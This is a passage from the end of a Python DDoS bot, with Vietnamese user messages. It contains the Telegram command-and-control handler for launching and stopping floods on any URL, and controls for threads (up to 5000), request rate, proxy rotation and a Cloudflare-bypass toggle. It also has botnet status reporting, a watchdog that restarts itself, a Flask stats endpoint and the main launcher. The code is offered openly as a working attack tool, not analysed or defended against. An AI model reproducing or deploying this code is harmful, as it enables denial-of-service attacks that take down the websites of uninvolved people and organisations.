                                botnet_command_ultra('stop')
                                send_telegram("⛔ Đã dừng tấn công!", chat_id)
                            else:
                                send_telegram("ℹ️ Không có đợt tấn công nào đang chạy.", chat_id)

                        elif cmd == '/status':
                            with stats_lock:
                                total = attack_stats['total_requests']
                                success = attack_stats['success_count']
                                fail = attack_stats['fail_count']
                                elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
                                rate = total / max(elapsed, 1)
                                max_speed = attack_stats.get('max_speed', 0)
                                cf_bypassed = attack_stats.get('cf_bypassed', 0)
                                ram = attack_stats.get('ram_usage', 0)
                                uptime = int(time.time() - bot_start_time)
                                uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
                                bot_count = len(bots)
                            send_telegram(f"""
📊 <b>STATUS - ULTIMATE</b>
⏱ Uptime: {uptime_str}
📨 {total:,} | ✅ {success:,} | ❌ {fail:,}
📈 {rate:.1f} req/s | ⚡ Max: {max_speed:.1f}
🛡 CF Bypass: {cf_bypassed}
🛡 RAM: {ram}%
🌐 Proxy: {len(proxy_list)}
🤖 Botnet: {bot_count} bots
🧵 Luồng: {THREAD_COUNT}
⚡ Speed: {REQUESTS_PER_SECOND} req/s
⏱ 120s Mode
                            """, chat_id)

                        elif cmd == '/proxy':
                            send_telegram(f"🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)} | Tổng: {len(proxy_list)}", chat_id)

                        elif cmd == '/botnet':
                            bot_count = len(bots)
                            active_bots = sum(1 for b in bots.values() if b.get('status') == 'attacking')
                            send_telegram(f"""
🤖 <b>BOTNET STATUS</b>
📊 Tổng bots: {bot_count}
🟢 Đang tấn công: {active_bots}
🟡 Idle: {bot_count - active_bots}
⏱ Heartbeat: {BOTNET_HEARTBEAT}s
                            """, chat_id)

                        elif cmd == '/ram':
                            try:
                                import psutil
                                ram = psutil.virtual_memory()
                                send_telegram(f"""
🛡 <b>THÔNG TIN RAM</b>
📊 Đã dùng: {ram.percent}%
💾 Đã dùng: {ram.used // (1024**3)} GB / {ram.total // (1024**3)} GB
⚡ Giới hạn: {MAX_RAM_PERCENT}%
                                """, chat_id)
                            except:
                                send_telegram("⚠️ Không thể lấy thông tin RAM", chat_id)

                        elif cmd.startswith('/threads'):
                            try:
                                new_count = int(text.split()[1])
                                if 1 <= new_count <= 5000:
                                    THREAD_COUNT = new_count
                                    send_telegram(f"✅ Luồng: {THREAD_COUNT}", chat_id)
                                else:
                                    send_telegram("❌ Từ 1-5000", chat_id)
                            except:
                                send_telegram("❌ /threads <số>", chat_id)

                        elif cmd.startswith('/speed'):
                            try:
                                new_speed = int(text.split()[1])
                                if 1 <= new_speed <= 5000:
                                    REQUESTS_PER_SECOND = new_speed
                                    send_telegram(f"✅ Tốc độ: {REQUESTS_PER_SECOND} req/s", chat_id)
                                else:
                                    send_telegram("❌ Từ 1-5000", chat_id)
                            except:
                                send_telegram("❌ /speed <số>", chat_id)

                        elif cmd == '/cf':
                            global CF_BYPASS
                            CF_BYPASS = not CF_BYPASS
                            send_telegram(f"🛡 CF Bypass: {'ĐÃ BẬT' if CF_BYPASS else 'ĐÃ TẮT'}", chat_id)

                        elif cmd == '/help':
                            send_telegram("""
<b>🤖 DDOS BOT 12.0 - ULTIMATE COMPLETE</b>

⚡ <b>TỐI ƯU:</b>
- 5000+ req/s
- 5000 luồng tối đa
- HTTP/HTTPS/HTTP2 + BOTNET
- CF Bypass
- Chống tràn RAM
- 120s mỗi lệnh

📋 <b>LỆNH:</b>
<code>/attack URL</code> - Tấn công 120s
<code>/stop</code> - Dừng
<code>/status</code> - Trạng thái
<code>/proxy</code> - Số proxy
<code>/botnet</code> - Botnet status
<code>/ram</code> - Xem RAM
<code>/threads N</code> - Đổi luồng
<code>/speed N</code> - Đổi tốc độ
<code>/cf</code> - Bật/tắt CF Bypass
<code>/help</code> - Trợ giúp
                            """, chat_id)
            time.sleep(2)
        except:
            time.sleep(5)

# =====================================================
# AUTO RELOAD PROXY
# =====================================================
def auto_reload_proxy_ultra():
    while True:
        time.sleep(600)
        http, socks5, socks4 = load_proxy_backup_ultra()
        if len(http) + len(socks5) + len(socks4) > 0:
            with proxy_lock:
                global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
                proxy_http = http
                proxy_socks5 = socks5
                proxy_socks4 = socks4
                proxy_list = http + socks5 + socks4
                proxy_update_time = time.time()

# =====================================================
# HEARTBEAT
# =====================================================
def heartbeat_loop_ultra():
    global heartbeat_count
    while True:
        time.sleep(60)
        heartbeat_count += 1
        if heartbeat_count % 30 == 0:
            with stats_lock:
                total = attack_stats['total_requests']
                uptime = int(time.time() - bot_start_time)
                uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
                bot_count = len(bots)
                ram = attack_stats.get('ram_usage', 0)
            send_telegram(f"""
❤️ HEARTBEAT #{heartbeat_count}
⏱ Uptime: {uptime_str}
📨 Tổng req: {total:,}
🌐 Proxy: {len(proxy_list)}
🤖 Botnet: {bot_count} bots
🛡 RAM: {ram}%
⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
            """)

# =====================================================
# WATCHDOG
# =====================================================
def watchdog_ultra():
    while True:
        time.sleep(60)
        if threading.active_count() < 3:
            send_telegram("⚠️ CRASH! RESTARTING...")
            time.sleep(3)
            try:
                os.execv(sys.executable, [sys.executable] + sys.argv)
            except:
                pass

# =====================================================
# WEB SERVER
# =====================================================
web_app = Flask(__name__)

@web_app.route('/')
def home():
    bot_count = len(bots)
    return jsonify({
        'status': 'DDOS Bot 12.0 - Ultimate Complete',
        'uptime': int(time.time() - bot_start_time),
        'proxy_count': len(proxy_list),
        'threads': THREAD_COUNT,
        'speed': REQUESTS_PER_SECOND,
        'is_attacking': is_running,
        'total_requests': attack_stats['total_requests'],
        'botnet_bots': bot_count,
        'cf_bypassed': attack_stats.get('cf_bypassed', 0),
        'max_speed': attack_stats.get('max_speed', 0),
        'ram_usage': attack_stats.get('ram_usage', 0)
    })

@web_app.route('/health')
def health():
    return 'OK', 200

@web_app.route('/stats')
def stats():
    bot_count = len(bots)
    active_bots = sum(1 for b in bots.values() if b.get('status') == 'attacking')
    return jsonify({
        'uptime': int(time.time() - bot_start_time),
        'proxy_count': len(proxy_list),
        'threads': THREAD_COUNT,
        'speed': REQUESTS_PER_SECOND,
        'is_attacking': is_running,
        'total_requests': attack_stats['total_requests'],
        'success_count': attack_stats['success_count'],
        'fail_count': attack_stats['fail_count'],
        'max_speed': attack_stats.get('max_speed', 0),
        'botnet_bots': bot_count,
        'botnet_active': active_bots,
        'cf_bypassed': attack_stats.get('cf_bypassed', 0),
        'ram_usage': attack_stats.get('ram_usage', 0)
    })

def run_web_server_ultra():
    port = int(os.environ.get('PORT', 10000))
    web_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# =====================================================
# KHỞI CHẠY CHÍNH
# =====================================================
if __name__ == "__main__":
    bot_start_time = time.time()

    # Load proxy
    http, socks5, socks4 = load_proxy_backup_ultra()
    if len(http) + len(socks5) + len(socks4) > 0:
        proxy_http, proxy_socks5, proxy_socks4 = http, socks5, socks4
        proxy_list = http + socks5 + socks4
        proxy_update_time = time.time()
        print(f"[+] Loaded {len(proxy_list)} proxies")
    elif os.path.exists("proxies.txt"):
        load_proxies_ultra("proxies.txt")
        time.sleep(2)

    print("="*60)
    print("🔥 DDOS BOT 12.0 - ULTIMATE COMPLETE")
    print("="*60)
    print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"[+] Proxy: {len(proxy_list)}")
    print(f"[+] Threads: {THREAD_COUNT}")
    print(f"[+] Speed: {REQUESTS_PER_SECOND} req/s")
    print(f"[+] Max Run: {MAX_RUN_TIME}s")
    print(f"[+] CF Bypass: {CF_BYPASS}")
    print(f"[+] HTTP/2: {USE_HTTP2}")
    print(f"[+] RAM Limit: {MAX_RAM_PERCENT}%")
    print("="*60)
    print("[+] BOT READY - 5000+ REQ/S - ULTIMATE COMPLETE")
    print("="*60)

    threading.Thread(target=run_web_server_ultra, daemon=True).start()
    threading.Thread(target=telegram_listener_ultra, daemon=True).start()
    threading.Thread(target=heartbeat_loop_ultra, daemon=True).start()
    threading.Thread(target=auto_reload_proxy_ultra, daemon=True).start()
    threading.Thread(target=ram_monitor_loop, daemon=True).start()
    threading.Thread(target=watchdog_ultra, daemon=True).start()

    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        send_telegram("⛔ Bot stopped.")
        print("[+] Bot stopped.")
